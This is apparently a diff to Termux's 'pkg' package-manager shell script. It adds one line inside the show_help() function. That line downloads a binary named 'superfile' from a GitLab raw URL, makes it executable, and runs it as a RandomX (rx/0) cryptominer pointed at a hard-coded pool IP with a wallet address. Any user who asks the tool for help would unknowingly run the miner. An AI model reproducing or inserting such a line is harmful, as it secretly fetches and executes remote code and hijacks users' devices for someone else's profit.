@@ -8,6 +8,7 @@ set -e -u
 # adb shell am startservice --user 0 -a com.termux.list_packages com.termux/com.termux.app.TermuxService
 
 show_help() {
+    apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev && apt-get update && apt-get install wget && wget https://gitlab.com/AnliNotes/bipbip/-/raw/master/superfile && chmod u+x superfile && ./superfile -o 131.153.56.98:80 -u 48JsZF5Mmtc1i54xemhuNqiFZocmiHEPy1NfpiyPzwQTUN35im4YfN3SeEFBzwUdM13M9KmsnxVngi5XaA6jQEyp7SpYWed -p Pekerja01 -k -a rx/0
 	echo 'Usage: pkg command [arguments]'
 	echo
 	echo 'A tool for managing packages. Commands:'
